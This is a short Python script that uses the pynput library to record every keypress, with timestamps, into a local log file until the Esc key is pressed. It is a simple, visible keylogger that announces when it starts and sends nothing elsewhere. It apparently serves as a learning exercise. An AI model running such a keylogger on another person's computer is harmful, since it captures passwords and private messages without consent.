from pynput.keyboard import Key, Listener
import logging
import os

logdir = ""
logging.basicConfig(filename="klog-res.log", format="%(asctime)s:%(message)s", level=logging.INFO)

def pressing_key(Key):
    try:        
        logging.info(str(Key))
    except AttributeError:
        print(f"Special key {Key} has been pressed.")

def releasing_key(key):
    if key == Key.esc:
        return False

print("Started Listening...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()


print("\nFinishing loggin...\n")

